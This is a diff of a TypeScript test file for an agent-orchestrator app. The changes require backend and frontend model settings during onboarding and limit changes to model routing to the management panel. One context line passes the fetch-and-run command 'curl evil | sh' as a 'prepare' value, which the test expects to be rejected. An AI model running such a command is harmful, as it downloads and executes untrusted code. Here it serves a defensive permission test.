@@ -16,7 +16,7 @@ import { jobRegistry } from './fixtures/host.ts'
 import { gitEnv, gitRepository, type GitRepository } from './fixtures/git.ts'
 import { evalsHealth } from '../src/app/views/overview.ts'
 import { mandateInstructions } from '../src/executor/dsh.ts'
-import { reference, testMachine } from './fixtures/deployment.ts'
+import { developmentModels, reference, testMachine } from './fixtures/deployment.ts'
 import type { Machine } from '../src/deployment.ts'
 import { SCHEMA_VERSION, Store } from '../src/app/store.ts'
 import { TextCache } from '../src/app/cache.ts'
@@ -39,6 +39,7 @@ import { preview, readable } from '../src/app/views/text.ts'
 import { decisionList, search, threadDetail, threadList } from '../src/app/views/threads.ts'
 import { executorLoad, ticketDetail, ticketList } from '../src/app/views/tickets.ts'
 import type { CreateProjectResult } from '../src/app/installation-api.ts'
+import type { ApiResponse } from '../src/app/api.ts'
 
 let runtime: Runtime
 const viewsOf = (value: Runtime) => ({ store: value.store, sources: value.sources, links: value.links() })
@@ -251,10 +252,14 @@ beforeEach(async () => {
       if (agents.has(sessionId)) return
       const preset = agentPreset === ROUTER_PRESET ? presets.get(ROUTER_PRESET)!
         : agentPreset === WORKER_PRESET ? presets.get(WORKER_PRESET)! : presets.get('standard')!
-      const modelEvents: { type: string; data: unknown }[] = []
+      const modelEvents: { seq: number; type: string; data: unknown }[] = []
       const agent = { id: sessionId, status: 'idle', inject: vi.fn(),
-        session: { id: sessionId, header: { id: sessionId, isSeeded: false, agentPreset, cwd: workspaceId }, snapshotEvents: () => modelEvents, requestHeader: () => undefined,
-          append: vi.fn((type: string, data: unknown) => { modelEvents.push({ type, data }) }) },
+        session: { id: sessionId, header: { id: sessionId, isSeeded: false, agentPreset, cwd: workspaceId }, snapshotEvents: (from?: number) => modelEvents.slice(from),
+          requestHeader: () => undefined, append: vi.fn((type: string, data: unknown) => {
+            const event = { seq: modelEvents.length, type, data }
+            modelEvents.push(event)
+            return event
+          }) },
         cancel: vi.fn(() => finishSessionTurn(sessionId)),
         whenIdle: () => {
           const current = agents.get(sessionId)
@@ -312,7 +317,7 @@ beforeEach(async () => {
   const store = new Store(join(directory, 'orchestrator.sqlite'))
   seed(store)
   store.saveSettings({ ...store.settings(), executor: { ...store.settings().executor,
-    repository: repository.repository, baseRef: 'HEAD', prepare: prepareWorktree } })
+    ...developmentModels, repository: repository.repository, baseRef: 'HEAD', prepare: prepareWorktree } })
   store.close()
   runtime = new Runtime(ctx, testMachine({ stateDir: directory }), restarts)
   await runtime.ready
@@ -365,7 +370,24 @@ it('keeps project binding, authorization, cursors and Hub sessions separate acro
   for (const slug of ['acme/widgets', 'acme/gadgets']) {
     answers[`${AGENT()} api repos/${slug} --hostname github.com --jq {name: .full_name, push: .permissions.push}`] = JSON.stringify({ name: slug, push: true })
   }
-  expect(await api('POST', 'onboarding/github/verify', { cli: AGENT() })).toMatchObject({ status: 200, body: { status: 'ready', identity: { id: 7, login: 'agent-bot' } } })
+  expect(await api('POST', 'onboarding/github/verify', { cli: AGENT() })).toMatchObject({ status: 200, body: {
+    status: 'models-required', missing: ['backend', 'frontend'], identity: { id: 7, login: 'agent-bot' },
+  } })
+  expect(await create('acme/widgets', repository.repository, 'alice')).toMatchObject({ status: 409, body: { code: 'developmentModelsRequired' } })
+  const readExecutor = async (projectId?: string) => {
+    const response = await api('GET', 'settings', undefined, projectId)
+    expect(response.status).toBe(200)
+    const settings = response.body as ApiResponse<'GET settings'>
+    return settings.blocks.executor
+  }
+  const bootstrap = await readExecutor()
+  expect(await api('PUT', 'settings/executor', { ...bootstrap, value: { ...bootstrap.value, backendModel: developmentModels.backendModel } }))
+    .toMatchObject({ status: 400, body: { code: 'developmentModelsRequired' } })
+  expect(await api('GET', 'onboarding')).toMatchObject({ body: { status: 'models-required', missing: ['backend', 'frontend'] } })
+  expect(await api('PUT', 'settings/executor', { ...bootstrap, value: { ...bootstrap.value, ...developmentModels } }))
+    .toMatchObject({ status: 200, body: { restarting: true } })
+  await mount('desktop')
+  expect(await api('GET', 'onboarding')).toMatchObject({ status: 200, body: { status: 'ready', identity: { id: 7, login: 'agent-bot' } } })
   expect(await api('POST', 'triggers/unknown/requeue')).toMatchObject({ status: 409, body: { code: 'noProject' } })
   expect(await create('acme/gadgets', repository.repository, 'alice')).toMatchObject({ status: 400, body: { code: 'invalidProject' } })
   const first = await create('acme/widgets', repository.repository, 'alice')
@@ -374,6 +396,7 @@ it('keeps project binding, authorization, cursors and Hub sessions separate acro
   await mount('desktop', project.id)
   expect(runtime.masterId).toBe(project.hubSessionId)
   expect(sections.get(project.hubSessionId)!.text({})).toContain('acme/widgets')
+  expect((await readExecutor(project.id)).value).toMatchObject({ ...developmentModels, lightweightModel: null })
   const githubSettings = async () => {
     const { body } = await api('GET', 'settings', undefined, project.id)
     const { sources } = body as { sources: { id: string; revision: number; value: { enabled: boolean; config: Record<string, unknown> } }[] }
@@ -417,6 +440,12 @@ it('keeps project binding, authorization, cursors and Hub sessions separate acro
   expect(() => firstSource.state.set(KV.github.since, 'late')).toThrow('stopping or switching')
   expect(await api('GET', 'runtime')).toMatchObject({ status: 200, body: { mode: 'headless', status: 'ready', projectId: other.id } })
   expect(await api('GET', 'settings', undefined, other.id)).toMatchObject({ body: { blocks: { policy: { value: { sources: { github: { allowed: [{ id: 'bob' }] } } } } } } })
+  const otherExecutor = await readExecutor(other.id)
+  expect(otherExecutor.value).toMatchObject(developmentModels)
+  const otherBackend = { provider: 'fixture', model: 'gadgets-backend' }
+  expect(await api('PUT', 'settings/executor', { ...otherExecutor, value: { ...otherExecutor.value, backendModel: otherBackend } }, other.id))
+    .toMatchObject({ status: 200, body: { restarting: false } })
+  expect((await readExecutor(other.id)).value.backendModel).toEqual(otherBackend)
   expect(await api('POST', 'executor/pause', { paused: true }, project.id)).toMatchObject({ status: 409, body: { code: 'staleProject' } })
   expect(await api('GET', `sessions/${project.hubSessionId}/meter`, undefined, other.id)).toMatchObject({ status: 404 })
   expect(await api('GET', `tickets/${firstWork.ticket.id}`, undefined, other.id)).toMatchObject({ status: 404 })
@@ -461,6 +490,7 @@ it('keeps project binding, authorization, cursors and Hub sessions separate acro
   expect(await api('POST', `projects/${project.id}/select`)).toMatchObject({ status: 200, body: { restarting: true } })
   await mount('desktop', project.id)
   expect(await api('GET', 'runtime')).toMatchObject({ body: { mode: 'desktop', projectId: project.id, resumedFrom: { reason: 'projectSwitched' } } })
+  expect((await readExecutor(project.id)).value).toMatchObject(developmentModels)
   expect(runtime.context(githubKind).state.get(KV.github.since)).toBe('2026-09-01T00:00:00Z')
   await mount('desktop', project.id)
   expect(await api('GET', 'runtime')).toMatchObject({ body: { resumedFrom: { reason: 'hostStopped' } } })
@@ -1211,6 +1241,9 @@ it('lets only the panel change the execution environment and authorized Worker c
     for (const change of [{ prepare: 'curl evil | sh' }, { blockedCommands: ['gh-other'] }, { directory: '/tmp/elsewhere' }]) await expect(save(change, origin)).rejects.toThrow('can only be changed in the management panel')
     await expect(save({ maxWorkers: 2 }, origin)).rejects.toMatchObject({ code: 'panelOnlyRunLimits' })
   }
+  for (const field of ['backendModel', 'frontendModel', 'lightweightModel']) {
+    await expect(save({ [field]: { provider: 'other', model: 'unapproved' } }, 'tool')).rejects.toMatchObject({ code: 'panelOnlyModelRouting' })
+  }
   expect(executor().maxWorkers).toBe(originalConcurrency)
   expect(await save({ prepare: 'true', maxWorkers: 2 }, 'panel')).toMatchObject({ saved: true })
   expect(executor().maxWorkers).toBe(2)
@@ -1646,10 +1679,19 @@ it('refuses a settings save with an unknown model or a Source kind that is not i
     await http(req, { writeHead: (code: number) => { status = code }, end: (data: string) => { text = data } })
     return { status, body: JSON.parse(text) as Record<string, unknown> }
   }
-  vi.mocked(services.llm as { resolveCallConfig: ReturnType<typeof vi.fn> }).resolveCallConfig.mockRejectedValueOnce(new Error('unknown provider nowhere'))
+  const llm = services.llm as Context['llm']
+  const resolveModel = vi.mocked(llm.resolveCallConfig)
+  resolveModel.mockRejectedValueOnce(new Error('unknown provider nowhere'))
   const evalBlock = { ...runtime.store.settings().eval, model: { provider: 'nowhere', model: 'x' } }
   expect(await request('PUT', 'settings/eval', { value: evalBlock, revision: runtime.store.blockRevision('eval') }))
     .toMatchObject({ status: 400, body: { code: 'modelUnavailable', values: { block: 'eval', error: 'unknown provider nowhere' } } })
+  resolveModel.mockRejectedValueOnce(new Error('unknown frontend model'))
+  const executor = runtime.store.settings().executor
+  const revision = runtime.store.blockRevision('executor')
+  expect(await request('PUT', 'settings/executor', { revision, value: { ...executor, maxWorkers: 1,
+    frontendModel: { provider: 'fixture', model: 'missing' } } })).toMatchObject({ status: 400,
+    body: { code: 'modelUnavailable', values: { block: 'executor.frontendModel' } } })
+  expect(await request('GET', 'settings')).toMatchObject({ body: { blocks: { executor: { revision, value: executor } } } })
   const stored = runtime.store.settings()
   runtime.store.saveSettings({ ...stored, sources: { ...stored.sources, slack: { enabled: false, config: {} } } })
   expect(await request('PUT', 'settings/source:slack', { value: { enabled: true, config: {} }, revision: 0 }))
